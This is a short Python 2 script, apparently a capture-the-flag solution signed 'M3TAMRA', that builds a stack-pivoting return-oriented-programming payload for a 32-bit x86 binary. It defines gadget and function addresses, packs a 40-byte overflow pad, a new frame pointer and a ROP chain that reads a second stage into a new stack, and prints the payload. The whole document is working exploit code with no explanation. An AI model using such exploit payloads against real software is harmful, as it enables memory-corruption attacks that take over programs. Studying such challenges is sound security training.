# M3TAMRA
import struct
ret = 0x08048569
ori = 0x080485c4
pro = 0x0804862c
#open_flag = 0x8048590
#read_flag = 0x80485f4
#print_flag = 0x804863e
pop_ret = 0x8048395
popx4_ret = 0x80486ec
add_esp_12 = 0x8048392
leave_ret = 0x08048680
trash = 0xaaaaaaaa
read = 0x80483b0
read_stdin = 0x804855b
#new_stack_addr = 0x804a100
new_stack_addr = 0x804a6b0
new_ebp = new_stack_addr
rop_chain = [
    read,
    leave_ret,
    0,                  # stdin
    new_stack_addr,     # dest
    0x200,              # length to read
    trash,              # old ebp
    ret,
    pop_ret,
    0xbadbeeef,         # ret arg1
    ori,
    pro,
    0xabcdefff,         # ori arg1
    0x78563412,         # ori arg2
    pop_ret,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
    ]
#trash = "a"*40
trash = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa"
payload = trash + struct.pack("I", new_ebp) + "".join([struct.pack("I", i) for i in rop_chain])
print payload
